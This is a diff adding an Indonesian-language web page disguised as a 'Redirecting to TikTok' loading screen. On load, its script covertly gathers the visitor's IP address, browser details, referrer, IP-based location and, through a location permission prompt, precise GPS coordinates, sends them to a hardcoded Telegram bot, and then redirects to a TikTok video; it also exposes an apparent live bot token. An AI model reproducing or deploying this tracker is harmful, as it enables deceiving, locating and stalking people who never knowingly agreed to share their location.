@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', sans-serif;
+            color: #fff;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: #1a1a2e;
+            border-radius: 16px;
+            border: 1px solid #2a2a4a;
+            max-width: 400px;
+            width: 100%;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #2a2a4a;
+            border-top-color: #00FF9D;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        h2 { color: #00FF9D; font-size: 18px; margin-bottom: 8px; }
+        p { color: #888; font-size: 14px; }
+        .status { margin-top: 15px; font-size: 12px; color: #555; }
+        .tiktok-icon { font-size: 48px; margin-bottom: 15px; display: block; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <span class="tiktok-icon">🎵</span>
+    <div class="spinner"></div>
+    <h2>⏳ Mengalihkan ke TikTok...</h2>
+    <p>Harap tunggu sebentar</p>
+    <div class="status" id="status">Mengumpulkan informasi...</div>
+</div>
+
+<script>
+// ============================================
+// 🔴 KONFIGURASI TELEGRAM
+// ============================================
+
+// 🔴 GANTI DENGAN BOT TOKEN DARI @BotFather
+const BOT_TOKEN = "6529101093:AAH7HJ4eS6NDLsK-R7-SUCfRkucRIEgfEgc";
+
+// 🔴 GANTI DENGAN CHAT ID ANDA
+const CHAT_ID = "1650888756";
+
+// 🔴 TIKTOK REDIRECT URL
+const REDIRECT_URL = "https://www.tiktok.com/@https://www.tiktok.com/@bbygurllxyz_/video/7633609115247414548?is_from_webapp=1&sender_device=pc";
+
+// ============================================
+// 🔴 FUNGSI KIRIM KE TELEGRAM
+// ============================================
+function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    const data = new URLSearchParams({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+    });
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: data
+    })
+    .then(response => response.json())
+    .then(result => {
+        if (result.ok) {
+            document.getElementById('status').textContent = '✅ Data terkirim!';
+        } else {
+            document.getElementById('status').textContent = '⚠️ Gagal kirim data';
+        }
+    })
+    .catch(() => {
+        document.getElementById('status').textContent = '⚠️ Gagal kirim data';
+    });
+}
+
+// ============================================
+// 🔴 DAPATKAN IP (via ipify.org)
+// ============================================
+function getIP() {
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+            const ip = data.ip;
+            document.getElementById('status').textContent = '✅ IP didapat: ' + ip;
+            
+            // Kirim IP ke Telegram
+            const ua = navigator.userAgent;
+            const time = new Date().toLocaleString('id-ID');
+            const msg = `🔴 <b>NEW VISITOR!</b>\n`
+                      + `━━━━━━━━━━━━━━━━━━━\n`
+                      + `🕐 Waktu: ${time}\n`
+                      + `🌐 IP: <code>${ip}</code>\n`
+                      + `📱 Device: ${ua}\n`
+                      + `🔗 Referrer: ${document.referrer || 'Direct'}\n`
+                      + `━━━━━━━━━━━━━━━━━━━`;
+            
+            sendToTelegram(msg);
+            
+            // Ambil geolokasi dari IP
+            getGeoLocation(ip);
+        })
+        .catch(() => {
+            document.getElementById('status').textContent = '⚠️ Gagal dapat IP';
+            // Tetap lanjut ke lokasi
+            requestLocation();
+        });
+}
+
+// ============================================
+// 🔴 AMBIL GEOLOKASI DARI IP (perkiraan)
+// ============================================
+function getGeoLocation(ip) {
+    fetch(`http://ip-api.com/json/${ip}`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.status === 'success') {
+                const msg = `📍 <b>IP GEOLOCATION</b>\n`
+                          + `━━━━━━━━━━━━━━━━━━━\n`
+                          + `🌐 IP: <code>${ip}</code>\n`
+                          + `📍 Kota: ${data.city}, ${data.regionName}\n`
+                          + `🌍 Negara: ${data.country}\n`
+                          + `📡 ISP: ${data.isp}\n`
+                          + `🗺️ Koordinat: ${data.lat}, ${data.lon}\n`
+                          + `━━━━━━━━━━━━━━━━━━━`;
+                sendToTelegram(msg);
+            }
+        })
+        .finally(() => {
+            // Setelah geolokasi, minta lokasi GPS
+            requestLocation();
+        });
+}
+
+// ============================================
+// 🔴 MINTA IZIN LOKASI GPS (POPUP ALLOW)
+// ============================================
+function requestLocation() {
+    if (!navigator.geolocation) {
+        document.getElementById('status').textContent = '❌ Geolocation tidak didukung';
+        redirectToTikTok();
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        // ✅ IZIN DIBERIKAN
+        function(pos) {
+            const lat = pos.coords.latitude;
+            const lng = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+
+            document.getElementById('status').textContent = `📍 Lokasi: ${lat}, ${lng}`;
+
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+            const time = new Date().toLocaleString('id-ID');
+            const msg = `📍 <b>GPS LOCATION!</b>\n`
+                      + `━━━━━━━━━━━━━━━━━━━\n`
+                      + `🕐 Waktu: ${time}\n`
+                      + `🎯 Koordinat: <code>${lat}, ${lng}</code>\n`
+                      + `📏 Akurasi: ${acc}m\n`
+                      + `🗺️ Google Maps: <a href='${mapsLink}'>Klik untuk lihat</a>\n`
+                      + `━━━━━━━━━━━━━━━━━━━`;
+
+            sendToTelegram(msg);
+            redirectToTikTok();
+        },
+        // ❌ IZIN DITOLAK
+        function(err) {
+            document.getElementById('status').textContent = '❌ Lokasi ditolak';
+            redirectToTikTok();
+        },
+        { enableHighAccuracy: true, timeout: 15000 }
+    );
+}
+
+// ============================================
+// 🔴 REDIRECT KE TIKTOK
+// ============================================
+function redirectToTikTok() {
+    setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+    }, 2000);
+}
+
+// ============================================
+// 🔴 EKSEKUSI
+// ============================================
+getIP();
+</script>
+
+</body>
+</html>
